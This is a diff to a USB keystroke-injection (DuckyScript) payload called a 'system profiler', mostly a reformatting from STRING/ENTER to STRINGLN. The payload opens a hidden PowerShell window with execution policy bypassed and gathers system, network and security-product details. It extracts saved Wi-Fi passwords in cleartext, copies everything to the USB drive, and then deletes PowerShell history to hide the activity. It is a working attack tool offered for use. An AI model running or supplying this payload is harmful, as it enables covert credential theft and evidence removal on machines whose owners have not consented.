@@ -10,139 +10,105 @@ REM Version:       1.0
 REM Category:      Recon
 REM ====================================================
 
+DEFINE #LABEL DUCKY
+
 DELAY 1000
 REM Open PowerShell hidden
 GUI r
 DELAY 500
-STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
-ENTER
+STRINGLN powershell -ExecutionPolicy Bypass -WindowStyle Hidden
 DELAY 1500
 
 REM Find the Ducky drive
-STRING $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq 'DUCKY'}).DeviceID;if(!$d){$d=$env:TEMP}
-ENTER
+STRINGLN $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq '#LABEL'}).DeviceID;if(!$d){$d=$env:TEMP}
 DELAY 300
 
 REM Build comprehensive report
-STRING $r=@();$r+="=== NULLSEC SYSTEM PROFILER ==="
-ENTER
+STRINGLN $r=@();$r+="=== NULLSEC SYSTEM PROFILER ==="
 DELAY 100
-STRING $r+="Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-ENTER
+STRINGLN $r+="Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 DELAY 100
-STRING $r+="Hostname: $env:COMPUTERNAME"
-ENTER
+STRINGLN $r+="Hostname: $env:COMPUTERNAME"
 DELAY 100
-STRING $r+="Username: $env:USERNAME"
-ENTER
+STRINGLN $r+="Username: $env:USERNAME"
 DELAY 100
-STRING $r+="Domain: $env:USERDOMAIN"
-ENTER
+STRINGLN $r+="Domain: $env:USERDOMAIN"
 DELAY 100
 
 REM OS Information
-STRING $r+="`n=== OPERATING SYSTEM ==="
-ENTER
+STRINGLN $r+="`n=== OPERATING SYSTEM ==="
 DELAY 100
-STRING $os=Get-CimInstance Win32_OperatingSystem;$r+="OS: $($os.Caption) $($os.Version)"
-ENTER
+STRINGLN $os=Get-CimInstance Win32_OperatingSystem;$r+="OS: $($os.Caption) $($os.Version)"
 DELAY 100
-STRING $r+="Build: $($os.BuildNumber) | Arch: $($os.OSArchitecture)"
-ENTER
+STRINGLN $r+="Build: $($os.BuildNumber) | Arch: $($os.OSArchitecture)"
 DELAY 100
-STRING $r+="Install Date: $($os.InstallDate)"
-ENTER
+STRINGLN $r+="Install Date: $($os.InstallDate)"
 DELAY 100
-STRING $r+="Last Boot: $($os.LastBootUpTime)"
-ENTER
+STRINGLN $r+="Last Boot: $($os.LastBootUpTime)"
 DELAY 100
 
 REM Hardware
-STRING $r+="`n=== HARDWARE ==="
-ENTER
+STRINGLN $r+="`n=== HARDWARE ==="
 DELAY 100
-STRING $cpu=Get-CimInstance Win32_Processor;$r+="CPU: $($cpu.Name) ($($cpu.NumberOfCores) cores)"
-ENTER
+STRINGLN $cpu=Get-CimInstance Win32_Processor;$r+="CPU: $($cpu.Name) ($($cpu.NumberOfCores) cores)"
 DELAY 200
-STRING $ram=Get-CimInstance Win32_PhysicalMemory|Measure-Object -Property Capacity -Sum;$r+="RAM: $([math]::Round($ram.Sum/1GB,2)) GB"
-ENTER
+STRINGLN $ram=Get-CimInstance Win32_PhysicalMemory|Measure-Object -Property Capacity -Sum;$r+="RAM: $([math]::Round($ram.Sum/1GB,2)) GB"
 DELAY 200
-STRING Get-CimInstance Win32_DiskDrive|%{$r+="Disk: $($_.Model) - $([math]::Round($_.Size/1GB,1)) GB"}
-ENTER
+STRINGLN Get-CimInstance Win32_DiskDrive|%{$r+="Disk: $($_.Model) - $([math]::Round($_.Size/1GB,1)) GB"}
 DELAY 200
-STRING $gpu=Get-CimInstance Win32_VideoController;$r+="GPU: $($gpu.Name)"
-ENTER
+STRINGLN $gpu=Get-CimInstance Win32_VideoController;$r+="GPU: $($gpu.Name)"
 DELAY 200
 
 REM Network
-STRING $r+="`n=== NETWORK ==="
-ENTER
+STRINGLN $r+="`n=== NETWORK ==="
 DELAY 100
-STRING Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne '127.0.0.1'}|%{$r+="IP: $($_.IPAddress)/$($_.PrefixLength) ($($_.InterfaceAlias))"}
-ENTER
+STRINGLN Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne '127.0.0.1'}|%{$r+="IP: $($_.IPAddress)/$($_.PrefixLength) ($($_.InterfaceAlias))"}
 DELAY 300
-STRING $r+="Gateway: $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop)"
-ENTER
+STRINGLN $r+="Gateway: $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop)"
 DELAY 200
-STRING $dns=Get-DnsClientServerAddress -AddressFamily IPv4|Select-Object -ExpandProperty ServerAddresses -Unique;$r+="DNS: $($dns -join ', ')"
-ENTER
+STRINGLN $dns=Get-DnsClientServerAddress -AddressFamily IPv4|Select-Object -ExpandProperty ServerAddresses -Unique;$r+="DNS: $($dns -join ', ')"
 DELAY 200
-STRING $r+="Public IP: $((Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content)"
-ENTER
+STRINGLN $r+="Public IP: $((Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content)"
 DELAY 500
 
 REM WiFi Profiles
-STRING $r+="`n=== WIFI PROFILES ==="
-ENTER
+STRINGLN $r+="`n=== WIFI PROFILES ==="
 DELAY 100
-STRING $profiles=netsh wlan show profiles|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()};$r+="Saved Networks: $($profiles.Count)"
-ENTER
+STRINGLN $profiles=netsh wlan show profiles|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()};$r+="Saved Networks: $($profiles.Count)"
 DELAY 300
-STRING foreach($p in $profiles){try{$key=netsh wlan show profile name="$p" key=clear|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()};$r+="  $p : $key"}catch{}}
-ENTER
+STRINGLN foreach($p in $profiles){try{$key=netsh wlan show profile name="$p" key=clear|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()};$r+="  $p : $key"}catch{}}
 DELAY 1000
 
 REM Security
-STRING $r+="`n=== SECURITY ==="
-ENTER
+STRINGLN $r+="`n=== SECURITY ==="
 DELAY 100
-STRING $av=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;$r+="AV: $($av.displayName -join ', ')"
-ENTER
+STRINGLN $av=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue;$r+="AV: $($av.displayName -join ', ')"
 DELAY 200
-STRING $fw=Get-NetFirewallProfile|%{"$($_.Name):$($_.Enabled)"};$r+="Firewall: $($fw -join ', ')"
-ENTER
+STRINGLN $fw=Get-NetFirewallProfile|%{"$($_.Name):$($_.Enabled)"};$r+="Firewall: $($fw -join ', ')"
 DELAY 200
-STRING $r+="UAC: $((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA)"
-ENTER
+STRINGLN $r+="UAC: $((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA)"
 DELAY 200
-STRING $r+="BitLocker: $((Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).ProtectionStatus)"
-ENTER
+STRINGLN $r+="BitLocker: $((Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).ProtectionStatus)"
 DELAY 200
 
 REM Installed Software
-STRING $r+="`n=== INSTALLED SOFTWARE (Top 30) ==="
-ENTER
+STRINGLN $r+="`n=== INSTALLED SOFTWARE (Top 30) ==="
 DELAY 100
-STRING Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Sort-Object InstallDate -Descending|Select-Object -First 30|%{$r+="  $($_.DisplayName) v$($_.DisplayVersion)"}
-ENTER
+STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Sort-Object InstallDate -Descending|Select-Object -First 30|%{$r+="  $($_.DisplayName) v$($_.DisplayVersion)"}
 DELAY 500
 
 REM Running Processes
-STRING $r+="`n=== TOP PROCESSES (by memory) ==="
-ENTER
+STRINGLN $r+="`n=== TOP PROCESSES (by memory) ==="
 DELAY 100
-STRING Get-Process|Sort-Object WorkingSet64 -Descending|Select-Object -First 15|%{$r+="  $($_.ProcessName) - $([math]::Round($_.WorkingSet64/1MB,1)) MB (PID: $($_.Id))"}
-ENTER
+STRINGLN Get-Process|Sort-Object WorkingSet64 -Descending|Select-Object -First 15|%{$r+="  $($_.ProcessName) - $([math]::Round($_.WorkingSet64/1MB,1)) MB (PID: $($_.Id))"}
 DELAY 300
 
 REM Save report
-STRING $r+= "`n=== END REPORT ==="
-ENTER
+STRINGLN $r+= "`n=== END REPORT ==="
 DELAY 100
-STRING $r -join "`n"|Out-File "$d\system_profile_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
-ENTER
+STRINGLN $r -join "`n"|Out-File "$d\system_profile_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
 DELAY 500
 
 REM Clean up
-STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue;exit
-ENTER
+REM WARNING: The following line deletes ALL PowerShell history. Comment out if not desired.
+STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue;exit
